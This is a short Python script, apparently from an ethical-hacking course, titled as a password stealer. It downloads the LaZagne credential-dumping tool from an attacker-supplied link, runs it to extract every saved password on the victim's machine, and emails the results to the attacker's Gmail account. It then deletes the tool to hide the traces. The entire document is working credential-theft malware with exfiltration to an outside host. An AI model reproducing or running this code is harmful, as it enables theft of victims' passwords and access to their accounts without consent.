# Password Stealer Via Email

#!/use/bin/env python
import requests, subprocess, smtplib, os, tempfile, optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--email", dest="email", help="Email address to send passwords")
    parser.add_option("-p", "--password", dest="password", help="Password to the email address")
    parser.add_option("-l", "--link", dest="link", help="Link to laZagne.exe (Ex.: http://[Your IP]/laZagne.exe)")
    (options, arguments) = parser.parse_args()
    if not options.email:
        parser.error("[-] Please specify an email address to send passwords. Use --help for more info.")
    if not options.password:
        parser.error("[-] Please specify the password to the email address. Use --help for more info.")
    if not options.link:
        parser.error("[-] Please specify a link to laZagne.exe (Ex.: http://[Your IP]/laZagne.exe). Use --help for more info.")
    return options

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

options = get_arguments()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download(options.link)
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(options.email, options.password, result)
os.remove("laZagne.exe")

'''
https://github.com/AlessandroZ/LaZagne
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10451332?start=0 (Interacting With The File System)
'''